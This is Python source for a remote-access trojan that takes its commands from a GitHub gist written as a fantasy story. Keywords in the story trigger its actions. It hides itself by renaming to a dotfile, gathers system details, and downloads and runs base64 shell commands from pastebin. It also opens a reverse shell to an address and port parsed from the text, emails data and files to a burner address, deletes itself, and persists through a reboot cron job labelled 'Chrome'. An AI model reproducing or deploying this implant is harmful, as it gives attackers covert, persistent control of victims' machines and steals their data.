import time
import requests
import json
import hashlib
import random
import os
import re
import sys
import platform
import socket
import subprocess
import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from crontab import CronTab

FAVORITE_CHARACTER = "Eldenwyre"
BURNER_MAIL = ""
BURNER_PASS = ""
RECIP_BURNER = 'kepatip330@hype68.com'
GIST_ID = ""

def getStory(gistID="613ae1b7549c7c2735000465fcd3c275"):
    GITHUB_URL = f"https://api.github.com/gists/{gistID}"
    API_KEY = "REDACTED"  # TODO Will implement cleanly later
    res = requests.get(GITHUB_URL, {f"Authorization": f"token {API_KEY}"})
    return res


def send_email(data):
    # provide information
    body = json.dumps(data)
    mail_from = BURNER_MAIL
    mail_pass = BURNER_PASS
    mail_to = RECIP_BURNER

    # getting started with email format
    message = MIMEMultipart()
    message['From'] = mail_from
    message['To'] = mail_to
    message['Subject'] = FAVORITE_CHARACTER

    # configuring mail sending 
    if "Max Ter'Forg'r" in data:
        message.attach(MIMEText(body, 'plain'))
        files = [data["Max Ter'Forg'r"]]
        for file in files:
            with open(file, 'rb') as f:
                payload = MIMEBase('application', 'octate-stream')
                payload.set_payload((f).read())
                encoders.encode_base64(payload) 
                
                payload.add_header('Content-Decomposition', 'attachment; filename=%s' % files)
            message.attach(payload)

    # setup smtp
    session = smtplib.SMTP('smtp.gmail.com', 587) 
    session.starttls() 
    session.login(mail_from, mail_pass) 
    msg = message.as_string()
    session.sendmail(mail_from, mail_to, msg)
    session.quit()


def parse_marketplace(story):
    result = ""
    s = re.search('incantation "(.*)" and', story).group(1)
    result = s[5:13]
    return result


def parse_max(story):
    result = ""
    s = re.search('incantation "(.*)" and', story).group(1)
    result = s[-8:]
    return result


def parse_beach(story):
    result = ["", "", "", "", 0]
    s = re.search("color: (.*). A few", story).group(1)
    r = re.findall(r"\d+", s)
    result[1] = r[0]
    result[3] = r[1]
    s = re.search("daily chores: (.*).", story).group(1)
    r = re.findall(r"\d+", s)
    result[0] = r[0]
    result[2] = r[1]
    s = re.search("That'll be (.*) gold", story).group(1)
    result[4] = int(s)
    return result


def go_to_beach(COAST, SHORE):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((COAST, SHORE))
        s.send(base64.b64encode(str.encode("[*] Connection Established!\n")))
    except Exception as e:
        return e

    try:
        while True:
            data = (base64.b64decode(s.recv(4096))).decode("UTF-8")
            if data == "quit" or data == "exit":
                break  # If it's quit, then break out
            if data[:2] == "cd":
                os.chdir(data[3:])  # If it's cd, change directory.
            # Run  cmnd.
            if len(data) > 0:
                proc = subprocess.Popen(
                    data,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
                stdout_value = proc.stdout.read() + proc.stderr.read()  # Read output.
                output_str = str(stdout_value, "UTF-8")  # Format output.
                currentWD = "\n" + os.getcwd() + "> "
                s.send(
                    base64.b64encode(str.encode(output_str + currentWD))
                )  # Send output to listener.
    except Exception as e:
        s.close()
        return 1

    s.close()  # Close socket.


def knead_bread():
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
        s = (str(__file__).split("/"))[-1]
        application_path+="/"+s[:-3]
        os.remove(application_path)
    elif __file__:
        os.remove(__file__)
    sys.exit(0)


def parse_story(story):
    return_dict = {}
    ## Hide > Info > Command > File Exfil > Shell > Kill
    #Handle Hilda TODO Cron Reassignment
    if "Hilda" in story:
        if getattr(sys, 'frozen', False):
            application_path = os.path.dirname(sys.executable)
            s = (str(__file__).split("/"))[-1]
            application_path+="/"+s[:-3]
            a = application_path.split("/")
            a[-1] = "." + a[-1]
            os.rename(application_path, '/'.join(a))
        elif __file__:
            a = __file__.split("/")
            a[-1] = "." + a[-1]
            os.rename(__file__, '/'.join(a))
        
        return_dict['hilda'] = "Hidden :)"
    # Handle Info
    if "scarlet" in story:
        return_dict["scarlet"] = platform.uname()
    # Handle Market
    if "marketplace" in story:
        bin_link = parse_marketplace(story)
        cmd = requests.get(f"https://pastebin.com/raw/{bin_link}")
        if cmd.status_code == 200:
            cmdtext = (base64.b64decode(cmd.text)).decode("utf-8")
            out = (subprocess.check_output(cmdtext, stderr=subprocess.STDOUT, shell=True)).decode('utf-8')
        else:
            out = f"Failed to find pastebin {cmd.status_code}"

        return_dict["marketplace"] = out
    # Handle Max TODO Exfilling the file in email
    if "Max Ter'Forg'r" in story:
        bin_link = parse_max(story)
        cmd = requests.get(f"https://pastebin.com/raw/{bin_link}")
        if cmd.status_code == 200:
            out = (base64.b64decode(cmd.text)).decode("utf-8")
        else:
            out = f"Failed to find pastebin {cmd.status_code}"

        return_dict["Max Ter'Forg'r"] = out
    # Handle Beach
    if "beach" in story:
        beach_ret = parse_beach(story)
        coast = (
            beach_ret[0] + "." + beach_ret[1] + "." + beach_ret[2] + "." + beach_ret[3]
        )
        shore = beach_ret[4]
        x = go_to_beach(coast, shore)
        return_dict["beach"] = x
    # Knead Bread
    if "french-bread" in story:
        knead_bread()

    try:
        send_email(return_dict)
    except:
        return

    return


def get_path() -> str:
    #Get path
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
        s = (str(__file__).split("/"))[-1]
        application_path += "/" + s[:-3]
    elif __file__:
        application_path = os.path.realpath(__file__)

    return application_path


def add_chrome():
    application_path = get_path()

    job_string = f'chmod +x {application_path}; {application_path}'

    chrome = CronTab(user=True)
    for job in chrome:
        if job.comment == FAVORITE_CHARACTER:
            #Edit And Return
            job.set_command(job_string)
            return

    job = chrome.new(command=job_string, comment=FAVORITE_CHARACTER)
    job.every_reboot()

    chrome.write()


def main():
    # Add Self To "Chrome"
    try:
        add_chrome()
    except:
        pass
    # Loop for CC
    previous_req = ""
    while(True):
        try:
            res = getStory(GIST_ID)
            if res.status_code == 200:    
                res_dict = json.loads(res.text)
                d = res_dict["files"][FAVORITE_CHARACTER+".txt"]["content"]
                if d != previous_req:
                    previous_req = d
                    parse_story(d)
                else:
                    continue
            elif res.response.status == 403:
                pass
            else:
                pass
            time.sleep(random.randint(40,90))
        except: 
            time.sleep(random.randint(45,90))


if __name__ == "__main__":
    main()
